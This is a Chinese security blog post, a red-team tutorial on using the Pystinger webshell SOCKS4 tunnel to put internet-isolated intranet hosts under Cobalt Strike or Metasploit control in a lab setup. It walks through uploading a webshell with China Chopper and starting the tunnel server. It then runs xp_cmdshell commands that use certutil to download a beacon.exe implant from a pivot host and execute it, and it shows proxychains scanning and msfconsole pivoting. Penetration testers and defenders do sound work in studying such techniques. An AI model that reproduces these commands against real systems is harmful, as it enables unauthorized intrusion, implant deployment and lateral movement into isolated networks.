##  利用Pystinger Socks4上线不出网主机

原创 3had0w  [ 潇湘信安 ](javascript:void\(0\);)

**潇湘信安** ![]()

微信号 xxxasec

功能介绍 一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。

____

__

收录于话题

#内网安全 34

#安全工具 47

**声明：**
该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。  
---  
  
  

我们接着前两篇文章继续分享一篇利用Pystinger Socks4代理方式上线不出网主机的姿势，包括单主机和内网多台主机的两种常见场景！！！

  

项目地址：https://github.com/FunnyWolf/pystinger

  

 **相关阅读：  
**

[1、利用MSF上线断网主机的思路分享](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect)  

[2、利用goproxy
http上线不出网主机](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490438&idx=1&sn=a2e71148beb114e4f2212203631598e7&chksm=cfa6bf95f8d13683bbd2f04a21865e16021447b3e6317a6b2dbbe23a8916337d20d941e284e6&scene=21#wechat_redirect)

  

 **0x01 测试环境**

  *   *   * 

    
    
     攻击机（Kali）：192.168.56.101受害机1（Web）：192.168.56.102、192.168.186.3 - 双网卡受害机2（Data）：192.168.186.4 - 断网机

  

 **0x02 Pystinger简单介绍**

Pystinger由服务端`webshell`、`stinger_server`和客户端`stinger_client`两部分组成，可通过webshell实现内网SOCK4代理及端口映射，支持php/jsp(x)/aspx三种代理脚本。  
![](https://gitee.com/fuli009/images/raw/master/public/20210826123223.png)

  

webshell只负责流量转发，大部分建立连接及处理数据的工作由stinger_server完成，stinger_client则用于接收转发过来的流量数据以及与CS/MSF的listener建立TCP连接等。

  

大致原理如下图，更为详细的原理分析可阅读“奇安信安全服务”公众号中的“[红队攻防实践：不出网主机搭建内网隧道新思路](http://mp.weixin.qq.com/s?__biz=MzI4MzA0ODUwNw==&mid=2247484958&idx=1&sn=a6fcfa2f4b7c5e1d0b3d3a368b4c92ef&chksm=eb91e94adce6605cbd9f2716d69d11b805448edb215ecff160003ea4b87f5749862c6db58491&scene=21#wechat_redirect)”一文进行学习了解。

![](https://gitee.com/fuli009/images/raw/master/public/20210826123224.png)

  

 **0x03  Pystinger上线不出网主机**

我们先将Pystinger项目的服务端stinger_server.exe、proxy.aspx通过中国菜刀上传至目标磁盘可读写目录中，访问proxy.aspx返回`UTF-8`表示正常，接着执行以下命令启动服务端。  

  * 

    
    
    start C:\inetpub\wwwroot\stinger_server.exe 0.0.0.0

![](https://gitee.com/fuli009/images/raw/master/public/20210826123225.png)  

  

 **注：** 作者提示不要直接运行D:/XXX/stinger_server.exe，因为这样可能会导致TCP断连。

  

将客户端stinger_client上传至Kali攻击机的tmp临时目录，然后再执行以下命令将Socks4的代理流量转发到我们Kali攻击机60000端口上，只要把-
w参数替换为自己上传的代理脚本地址即可。

  *   * 

    
    
    root@kali:/tmp# chmod 777 stinger_clientroot@kali:/tmp# ./stinger_client -w http://192.168.56.102/proxy.aspx -l 127.0.0.1 -p 60000

![]()  

 **场景1：单主机上线**

已控主机为单主机，不出外网且仅允许访问目标Web的80端口。如遇这种场景时可在执行完以上操作后在CobaltStrike创建一个Listener，HTTP
Hosts填`127.0.0.1`，HTTP Port填`60020`。

![](https://gitee.com/fuli009/images/raw/master/public/20210826123226.png)  

 **场景2：多主机上线**

已控主机为内网其中一台主机，双网卡（192.168.56.X为出网段，192.168.186.X为不出网段），在对不出网段中的其他内网主机进行横向移动上线时可在执行完以上操作后在CobaltStrike创建一个Listener，HTTP
Hosts填`192.168.186.3`，HTTP Port填`60020`。

![](https://gitee.com/fuli009/images/raw/master/public/20210826123227.png)

  

配置好监听后生成一个可执行马儿，将该文件放至192.168.186.3的Web服务器中供192.168.186.4断网数据库服务器下载，再利用xp_cmdshell组件执行`beacon.exe`后即可成功上线，Pystinger客户端那边也收到了相关连接数据。

  *   * 

    
    
    EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.186.3/beacon.exe C:\ProgramData\beacon.exe'EXEC master..xp_cmdshell 'C:\ProgramData\beacon.exe'

![](https://gitee.com/fuli009/images/raw/master/public/20210826123228.png)![]()  

 **CobaltStrike监听设置**

  * 单主机上线：`CobaltStrike->Listeners->Add->127.0.0.1:60020`；

  * 多主机上线：`CobaltStrike->Listeners->Add->192.168.186.3:60020`；

  *  **注：** 目标主机为双网卡时必须用不出网IP段的内网IP地址进行监听才能上线不出网主机；

  

 **上线至MSF的利用姿势**

Kali攻击机上编辑/etc/proxychains.conf文件，底部添加一条socks4代理：127.0.0.1:60000，添加完成后先执行以下几条命令来验证下是否已经与不出网IP段通了？

  *   *   *   * 

    
    
    root@kali:~# proxychains telnet 192.168.186.4 1433root@kali:~# proxychains curl http://192.168.186.4root@kali:~# proxychains nmap -sT -Pn 192.168.186.4[...SNIP...]

  

如果通了就再用proxychains来启动msfconsole，用不出网IP段的内网IP地址进行监听即可。原理大家都懂，就不实操截图了...。

  *   * 

    
    
    root@kali:~# proxychains msfconsole -q[...SNIP...]

  

* * *

  
关注公众号回复“9527”可免费获取一套HTB靶场文档和视频，“1120”安全参考等安全杂志PDF电子版，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

* * *

 **推 荐 阅 读**

  
  
  
[![](https://gitee.com/fuli009/images/raw/master/public/20210826123229.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20210826123230.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20210826123231.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

* * *

 **欢 迎 私 下 骚 扰**

  
  
![]()

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

利用Pystinger Socks4上线不出网主机

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

